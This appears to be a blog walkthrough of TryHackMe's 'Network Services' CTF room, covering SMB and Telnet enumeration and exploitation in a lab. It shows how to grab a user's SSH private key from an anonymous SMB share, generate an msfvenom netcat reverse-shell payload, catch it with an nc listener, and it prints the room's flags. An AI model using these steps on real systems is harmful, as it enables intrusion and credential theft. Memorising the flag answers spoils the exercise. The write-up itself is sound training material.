---
layout: post
title: Network Services - TryHackMe
---


In this room, we’ll dive into SMB, Telnet, and FTP. We'll look at how to enumerate these services and explore ways to exploit them in CTFs.

Before starting, I’d recommend checking out the reading material provided with each task—it’ll give you a solid foundation. This guide will cover just the essentials needed to answer the questions.

## Task 2 Understanding SMB

**Answer the questions below**

**What does SMB stand for?**

> Server Message Block

**What type of protocol is SMB?**   

> response-request

**What do clients connect to servers using?**   

> TCP/IP

**What systems does Samba run on?**

> Unix


##  Task 3 Enumerating SMB

**Answer the questions below**

Conduct an nmap scan of your choosing, How many ports are open?

```
root@ip-10-10-113-212:~# nmap -sS 10.10.21.250
```

**What ports is SMB running on?**

> 139/445

**Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?**   

>  WORKGROUP

**What comes up as the name of the machine?**    

>  POLOSMB

**What operating system version is running?**    

>  6.1

**What share sticks out as something we might want to investigate?**    

>  profiles - IPC$ and print$ are default SMB shares. netlogon is a share that belongs to the Network Login service. By process of elimination, the share that sticks out is profiles


##  Task 4 Exploiting SMB

**Answer the questions below**

**What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?**

>  smbclient //10.10.10.2/secret -U suit -p 445

Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

>  No answer needed

Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

**Does the share allow anonymous access? Y/N?**
```
smbclient //10.10.21.250/profiles -U Anonymous
```
> Y

**Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?**

>  John Cactus

**What service has been configured to allow him to work from home?**

>  ssh

**Okay! Now we know this, what directory on the share should we look in?**

SSH keys are kept in the **.ssh** directory. By default, the private key for the server is saved in a file named **id_rsa**, while the public key is in **id_rsa.pub**. To connect to the server, we’ll need the private key. Since we don’t know John Cactus’s SSH username, I downloaded the public key, as it often includes the SSH username.

When working with an SMB server, multiple files can be downloaded at once using the mget command.

>  .ssh

**This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?**

>  id_rsa

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?

>  THM{smb_is_fun_eh?}

##  Task 5 Understanding Telnet

**Answer the questions below**

**What is Telnet?**    

>  application protocol

**What has slowly replaced Telnet?**

>  ssh

**How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?**

>  telnet 10.10.10.3 23

**The lack of what, means that all Telnet communication is in plaintext?**

>  encryption


##  Task 6 Enumerating Telnet

**Answer the questions below**

**How many ports are open on the target machine?**    

>  1

**What port is this?**

>  8012

**This port is unassigned, but still lists the protocol it's using, what protocol is this?**     

>  tcp

**Now re-run the nmap scan, without the -p- tag, how many ports show up as open?**

> 0

**Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.**

>  No answer needed

**Based on the title returned to us, what do we think this port could be used for?**

>  a backdoor

**Who could it belong to? Gathering possible usernames is an important step in enumeration.**

>  Skidy

**Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.**

>  No answer needed


##  Task 7 Exploiting Telnet

**Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.**

>  No answer needed

**Great! It's an open telnet connection! What welcome message do we receive?**

>  SKIDY'S BACKDOOR.

**Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)**

>  N

**Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.**

>  No answer needed

Start a tcpdump listener on your local machine.

If using your own machine with the OpenVPN connection, use:

sudo tcpdump ip proto \\icmp -i tun0
If using the AttackBox, use:

sudo tcpdump ip proto \\icmp -i ens5
This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

>  No answer needed

**Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)**

>  Y

**Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!**

>  No answer needed

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

**What word does the generated payload start with?**

> mkfifo

**Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:**

>  "nc -lvp [listening port]"

**What would the command look like for the listening port we selected in our payload?**


>  nc -lvp 4444

**Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!**

>  No answer needed

**Success! What is the contents of flag.txt?**

>  THM{y0u_g0t_th3_t3ln3t_fl4g}
